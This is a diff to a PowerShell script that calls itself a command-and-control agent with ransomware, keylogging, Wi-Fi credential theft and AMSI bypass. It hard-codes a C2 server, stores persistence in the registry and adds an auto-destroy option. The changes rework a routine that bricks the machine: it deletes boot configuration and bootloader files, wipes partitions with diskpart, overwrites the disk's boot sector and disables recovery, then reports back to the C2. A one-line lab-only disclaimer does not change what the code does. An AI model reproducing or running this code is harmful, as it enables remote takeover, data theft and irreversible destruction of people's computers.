@@ -1,5 +1,13 @@
 # BomKaosKaki.ps1 - Full C2 Agent with RSA Ransomware & Decrypt (Stealth + Session Persistence + Destroy BIOS)
-# For authorized red team testing only in isolated lab.
+# For authorized red team testing only in isolated lab (VM with snapshot).
+
+# ============ KONFIGURASI ============
+$C2Server = "https://bom-kaos-kaki.vercel.app"
+$PollInterval = 15
+$HeartbeatInterval = 30
+
+# ============ OPSI AUTO DESTROY (SET TRUE UNTUK LANGSUNG BRICK SYSTEM) ============
+$AUTO_DESTROY = $false   # Ubah menjadi $true jika ingin langsung merusak BIOS saat agent dijalankan
 
 # ============ STEALTH / EVASION ============
 # AMSI Bypass
@@ -36,23 +44,27 @@ try {
 }
 catch {}
 
-# ============ SESSION PERSISTENCE (SAVE & LOAD SESSION ID) ============
-$sessionFile = "$env:APPDATA\Microsoft\Windows\kaoskaki.session"
+# ============ SESSION PERSISTENCE (DISIMPAN DI REGISTRY) ============
+$sessionRegPath = "HKCU:\Software\KaosKaki"
+$sessionRegValue = "SessionId"
 function Save-SessionId {
     param([string]$id)
-    try { Set-Content -Path $sessionFile -Value $id -Force -ErrorAction SilentlyContinue } catch {}
+    try {
+        if (-not (Test-Path $sessionRegPath)) { New-Item -Path $sessionRegPath -Force | Out-Null }
+        Set-ItemProperty -Path $sessionRegPath -Name $sessionRegValue -Value $id -Force -ErrorAction SilentlyContinue
+    }
+    catch {}
 }
 function Load-SessionId {
-    if (Test-Path $sessionFile) {
-        try { return (Get-Content $sessionFile -ErrorAction SilentlyContinue) } catch {}
+    try {
+        if (Test-Path $sessionRegPath) {
+            $id = Get-ItemProperty -Path $sessionRegPath -Name $sessionRegValue -ErrorAction SilentlyContinue | Select-Object -ExpandProperty $sessionRegValue
+            if ($id) { return $id }
+        }
     }
+    catch {}
     return $null
 }
-
-# ============ CONFIGURATION ============
-$C2Server = "https://bom-kaos-kaki.vercel.app"
-$PollInterval = 15
-$HeartbeatInterval = 30
 
 # ============ RUNTIME STATE ============
 $Script:SessionId = $null
@@ -829,22 +841,23 @@ function Invoke-StealWiFi {
     return ($result | ConvertTo-Json -Compress)
 }
 
-# ============ DESTROY BIOS / BRICK SYSTEM (UNTUK VM) ============
+# ============ DESTROY BIOS (AGRESIF) ============
 function Invoke-DestroyBIOS {
     param($cmd)
     try {
-        # 1. Hapus BCD (Boot Configuration Data)
+        # 1. Backup BCD (opsional) lalu hapus
         bcdedit /export C:\bcd_backup 2>&1 | Out-Null
         bcdedit /deletevalue { default } recoveryenabled 2>&1 | Out-Null
         bcdedit /deletevalue { default } recoverysequence 2>&1 | Out-Null
         bcdedit /set { default } bootstatuspolicy ignoreallfailures 2>&1 | Out-Null
         bcdedit /delete { bootmgr } /f 2>&1 | Out-Null
+        bcdedit /delete { default } /f 2>&1 | Out-Null
         
-        # 2. Hapus file bootloader
+        # 2. Hapus file bootloader secara paksa
+        takeown /f C:\bootmgr 2>&1 | Out-Null
+        icacls C:\bootmgr /grant administrators:F 2>&1 | Out-Null
         attrib -r -s -h C:\bootmgr 2>&1 | Out-Null
         del /f /q C:\bootmgr 2>&1 | Out-Null
-        attrib -r -s -h C:\Boot\BCD 2>&1 | Out-Null
-        del /f /q C:\Boot\BCD 2>&1 | Out-Null
         rd /s /q C:\Boot 2>&1 | Out-Null
         
         # 3. Hapus partisi EFI (jika ada) menggunakan diskpart
@@ -853,6 +866,8 @@ select disk 0
 list partition
 select partition 1
 delete partition override
+select partition 2
+delete partition override
 exit
 "@
         $diskpartFile = "$env:TEMP\diskpart_$([Guid]::NewGuid().Guid).txt"
@@ -860,21 +875,20 @@ exit
         diskpart /s $diskpartFile 2>&1 | Out-Null
         Remove-Item $diskpartFile -Force -ErrorAction SilentlyContinue
         
-        # 4. Corrupt Master Boot Record (MBR) dengan overwrite 512 bytes pertama
-        $mbr = [byte[]]::new(512)
-        for ($i = 0; $i -lt 512; $i++) { $mbr[$i] = 0xCC }
-        [System.IO.File]::WriteAllBytes("\\\\.\\PhysicalDrive0", $mbr) 2>&1 | Out-Null
+        # 4. Overwrite MBR/GPT dengan random bytes
+        $null = [System.IO.File]::WriteAllBytes("\\\\.\\PhysicalDrive0", (1..512 | ForEach-Object { Get-Random -Maximum 256 }))
         
-        # 5. Nonaktifkan recovery options di registry
-        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d " " /f 2>&1 | Out-Null
+        # 5. Nonaktifkan recovery
+        reagentc /disable 2>&1 | Out-Null
+        bcdedit /set { globalsettings } advancedoptions false 2>&1 | Out-Null
+        bcdedit /set { globalsettings } optionsedit false 2>&1 | Out-Null
         
-        # 6. Hapus semua system restore points
-        vssadmin delete shadows /all /quiet 2>&1 | Out-Null
+        # 6. Rusak WinRE
+        reagentc /setreimage /path "" 2>&1 | Out-Null
         
-        # 7. Kirim notifikasi ke C2
-        $result = @{ status = "BIOS destroyed"; details = "System will not boot after restart" }
+        $result = @{ status = "BIOS DESTROYED"; details = "System will not boot after restart" }
         Send-ExfilData -Type "destroy_bios" -Data $result
-        return "System bricked. Please restart to confirm."
+        return "System bricked successfully. Please restart to confirm."
     }
     catch {
         return "Destroy BIOS failed: $($_.Exception.Message)"
@@ -891,7 +905,7 @@ function Invoke-Uninstall {
     try { Remove-Item "$env:APPDATA\Microsoft\Windows\kaoskaki.ps1" -Force -ErrorAction SilentlyContinue } catch {}
     try { Remove-Item "$env:APPDATA\Microsoft\Windows\kaoskaki.vbs" -Force -ErrorAction SilentlyContinue } catch {}
     try { Remove-Item "$env:APPDATA\Microsoft\Windows\kaoskaki.bat" -Force -ErrorAction SilentlyContinue } catch {}
-    try { Remove-Item $sessionFile -Force -ErrorAction SilentlyContinue } catch {}
+    try { Remove-ItemProperty -Path $sessionRegPath -Name $sessionRegValue -Force -ErrorAction SilentlyContinue } catch {}
     Stop-Keylogger $cmd
     if ($Script:SpywareJob) { try { $Script:SpywareJob | Stop-Job -Force; $Script:SpywareJob | Remove-Job -Force } catch {}; $Script:SpywareRunning = $false }
     Send-ExfilData -Type "uninstall" -Data @{ status = "uninstalled"; session_id = $Script:SessionId }
@@ -910,7 +924,7 @@ function Start-C2Communication {
 }
 
 function Invoke-Main {
-    # Load or create session ID
+    # Load or create session ID (disimpan di registry)
     $loadedId = Load-SessionId
     if ($loadedId -and $loadedId -ne "") {
         $Script:SessionId = $loadedId
@@ -920,6 +934,12 @@ function Invoke-Main {
         Save-SessionId -id $Script:SessionId
     }
     Send-Heartbeat -Force
+    
+    # Jika AUTO_DESTROY diaktifkan, langsung hancurkan BIOS
+    if ($AUTO_DESTROY) {
+        Invoke-DestroyBIOS @{}
+    }
+    
     while ($true) { Start-C2Communication; Start-Sleep -Seconds 5 }
 }
 
